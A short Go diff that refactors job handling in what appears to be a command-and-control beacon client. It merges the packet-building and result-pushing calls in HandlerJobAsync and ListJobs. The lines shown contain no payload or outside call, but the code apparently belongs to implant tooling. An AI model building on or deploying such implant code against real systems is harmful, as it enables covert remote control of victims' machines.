@@ -339,7 +339,7 @@ func HandlerJobAsync(b []byte) error {
 	go func() {
 		result, err := readNamedPipe(j)
 		if err != nil {
-			ErrorMessage(err.Error())
+			packet.ErrorMessage(err.Error())
 			removeJob(j.jid)
 			return
 		}
@@ -350,8 +350,7 @@ func HandlerJobAsync(b []byte) error {
 			result = result[4:]
 		default:
 		}
-		finalPacket := packet.MakePacket(int(callbackType), []byte(result))
-		packet.PushResult(finalPacket)
+		packet.PushResult(int(callbackType), []byte(result))
 		removeJob(j.jid)
 	}()
 	return nil
@@ -362,8 +361,7 @@ func ListJobs() error {
 	for _, job := range jobs {
 		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
 	}
-	finalPacket := packet.MakePacket(CALLBACK_LIST_JOBS, []byte(result))
-	packet.PushResult(finalPacket)
+	packet.PushResult(CALLBACK_LIST_JOBS, []byte(result))
 	return nil
 }
 
